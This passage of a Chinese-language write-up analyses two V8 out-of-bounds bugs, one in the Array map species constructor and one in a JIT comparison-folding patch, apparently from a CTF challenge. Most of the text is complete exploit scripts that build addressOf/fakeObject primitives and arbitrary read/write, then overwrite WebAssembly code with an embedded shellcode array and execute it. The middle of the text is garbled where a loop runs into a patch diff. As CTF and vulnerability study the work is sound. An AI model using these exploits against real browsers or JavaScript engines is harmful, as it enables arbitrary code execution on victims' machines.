        }
    };
    class MyArray extends Array {
      static get [Symbol.species]() {
          return Array1;
      }
    }
    a = new MyArray(1.1,2.2);
    var b = a.map(function(x) {return x+1});
    %DebugPrint(b);
但是最后映射结果的时候，仍然使用的之前的len，因此在进行函数映射时，由于没有检查用于存放结果的数组的长度，便发生了`越界写`。
        Node* result =
            CallStub(slow_case_continuation, context(), receiver(), callbackfn(),
                     this_arg(), a_.value(), o(), k_.value(), len(), to_.value());
      Node* len() { return len_; }
####  漏洞利用
既然能越界写，那么我们就越界覆盖后方Array对象的length，进而构造一个oob的arr，然后利用手法就和前面一样了。  
exp
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function u64_l(value) {
       dv.setFloat64(0,value,true);
       return dv.getUint32(0,true);
    }
    function u64_h(value) {
       dv.setFloat64(0,value,true);
       return dv.getUint32(4,true);
    }
    var obj = {};
    var oob_double_arr;
    var obj_arr;
    var arb_buf;
    class Array1 extends Array {
      constructor(len) {
          super(1); //将数组长度缩减为1
          oob_double_arr = [1.1,2.2];
          obj_arr = [obj];
          arb_buf = new ArrayBuffer(0x10);
        }
    };
    class MyArray extends Array {
      static get [Symbol.species]() {
          return Array1;
        }
    }
    a = new MyArray();
    //第8个位置将会写入数据
    a[8] = 0x1;
    //OOB
    var b = a.map(function(x) { return 1000; });
    var array_buffer_map = oob_double_arr[0xe];
    function addressOf(obj) {
       obj_arr[0] = obj;
       var addr = oob_double_arr[0xd];
       return addr;
    }
    function fakeObject(addr_h,addr_l) {
       oob_double_arr[0xd] = p64f(addr_l,addr_h);
       var mobj = obj_arr[0];
       return mobj;
    }
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    var d = addressOf(func);
    var wasm_shellcode_ptr_addr_h = u64_h(d);
    var wasm_shellcode_ptr_addr_l = u64_l(d) - 0x1 + 0x38;
    oob_double_arr[0x11] = p64f(0,0xffff);
    oob_double_arr[0x12] = p64f(wasm_shellcode_ptr_addr_l,wasm_shellcode_ptr_addr_h);
    var adv = new DataView(arb_buf);
    var wasm_shellcode_addr_l = adv.getUint32(0,true);
    var wasm_shellcode_addr_h = adv.getUint32(4,true);
    print('wasm_shellcode_addr=' + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));
    oob_double_arr[0x12] = p64f(wasm_shellcode_addr_l,wasm_shellcode_addr_h);
    //替换wasm的shellcode
    for (var i=0;i false
           if (m.right().Is(0)) return ReplaceBool(false);          // x  false
           if (m.IsFoldable()) {                                    // K  K
    -        return ReplaceBool(m.left().Value()  false
           if (m.left().IsWord32Sar() && m.right().HasValue()) {
该patch打在`MachineOperatorReducer::Reduce`函数中，可以推测这个漏洞与JIT编译器有关。  
JIT中的IR优化流程如下
其中MachineOperatorReducer发生在Reduce阶段也就是图中`SimplifiedLoweringPhase`阶段，`MachineOperatorReducer::Reduce`会将IR中间代码中的一些可以在编译时就计算出的条件直接优化为一个布尔值。  
而我们的patch正好打在了`IrOpcode::kInt32LessThan`分支，也就是如果IR代码中有`kInt32LessThan`的代码调用，将会出现问题，可以溢出一个单位。  
而数组的length则是Int32类型，尝试写出如下的测试代码
    function opt(x) {
       var a = [1.1,2.2,3.3,4.4];
       return a[4];
    }
    for (var i=0;i<0x20000;i++) {
       opt(i);
    }
    print(opt(i));
发现并没有发生溢出，为了追踪优化过程，我们v8自带的`Turbolizer`来查看v8生成的IR图，执行
    ./d8 1.js --trace-turbo --trace-turbo-path ../
生成IR图，然后用`Turbolizer`打开查看
发现其在`LoadElimination
Phase`阶段，直接使用`CheckBounds`来进行检查了，也就是还未到达`SimplifiedLoweringPhase`阶段时，JIT就已经知道这个为越界的访问。因此，我们可以将4包裹在一个字典对象里，这样在`LoadElimination
Phase`阶段，JIT就不知道越界了，因为后面还要进行`Escape Analyse`才能知道值。  
于是代码修改为这样
    function opt(x) {
       var a = [1.1,2.2,3.3,4.4];
       var e = {a:4}
       return a[e.a];
    }
    for (var i=0;i<0x20000;i++) {
       opt(i);
    }
    print(opt(i));
可以发现输出了一个double值
    root@ubuntu:~/Desktop/qwb2019-final-groupupjs/x64.debug# ./d8 1.js --trace-turbo --trace-turbo-path ../
    Concurrent recompilation has been disabled for tracing.
    ---------------------------------------------------    Begin compiling method opt using TurboFan
    ---------------------------------------------------    Finished compiling method opt using TurboFan
    ---------------------------------------------------    Begin compiling method  using TurboFan
    ---------------------------------------------------    Finished compiling method  using TurboFan
    -1.1885946300594787e+148
这回由于信息不足，不能在`LoadElimination Phase`阶段确定，因此仅检查了最大范围
然后在`SimplifiedLoweringPhase`阶段，用了`Uint32LessThan`，由于`Uint32LessThan`被patch过，因此结果为True，那么就可以越界访问了。
####  漏洞利用
构造出一个oob数组后，改写数组对象的MAP，然后构造`addressOf`和`fakeObject`原语。  
exp
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getBigUint64(0,true);
    }
    var arr;
    var obj_arr;
    function opt(){
       arr = [1.1,2.2,3.3,4.4];
       obj_arr = [arr];
       var e = {a:arr.length};
       return arr[e.a];
    }
    for(var i=0; i < 0x20000; i++){
        opt();
    }
    var double_element_map = opt();
    //print(u64f(double_element_map).toString(16));
    var obj_element_map = i2f64(u64f(double_element_map) + 0xa0n);
    print((u64f(double_element_map)).toString(16));
    function fakeObject_opt(addr) {
       arr = [addr,2.2,3.3,4.4];
       var e = {a:arr.length};
       arr[e.a] = obj_element_map;
       return arr;
    }
    //JIT优化
    for (var i=0;i<0x20000;i++) {
       fakeObject_opt(double_element_map);
    }
    function fakeObject(addr) {
       return fakeObject_opt(i2f64(addr + 0x1n))[0];
    }
    //获得MAP对象
    var double_element_map_obj = fakeObject_opt(double_element_map)[0];
    //print(double_element_map_obj);
    function addressOf_opt(obj) {
       var arr = [obj,obj,obj,obj];
       var e = {a:arr.length};
       arr[e.a] = double_element_map_obj;
       return arr;
    }
    //JIT优化
    for (var i=0;i<0x20000;i++) {
       addressOf_opt(buf);
    }
    function addressOf(obj) {
       var v = addressOf_opt(obj)[0];
       return u64f(v) - 0x1n;
    }
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
    var arb_buf = new ArrayBuffer(0x10);
    var faker_addr = addressOf(faker);
    print('faker_addr='+faker_addr.toString(16));
    wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x88n;
    var element_addr = faker_addr - 0x60n;
    print('element_addr=' + element_addr.toString(16));
    //fake a FixedDoubleArray
    faker[0] = double_element_map;
    faker[1] = i2f64(0n);
    faker[2] = i2f64(element_addr+0x1n);
    faker[3] = i2f64(0x300000000000n);
    var oob_arr = fakeObject(element_addr + 0x10n);
    oob_arr[0x11] = i2f64(0x1000n); //修改ArrayBuffer的length
    oob_arr[0x12] = i2f64(wasm_shellcode_ptr_addr);
    var adv = new DataView(arb_buf);
    var wasm_shellcode_addr = adv.getBigUint64(0,true);
    print('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
    oob_arr[0x12] = i2f64(wasm_shellcode_addr);
    //替换wasm的shellcode
    for (var i=0;i<shellcode.length;i++) {
       adv.setUint32(i*4,shellcode[i],true);
    }
    //%SystemBreak();
    //执行shellcode
    func();
## 0x05 感想
oob类型的v8漏洞，其利用手法大多相似，不同点在于如何构造出oob数组。从一开始的直入主题到一般情况再到回调函数中的oob以及JIT中的oob，收获了许多知识。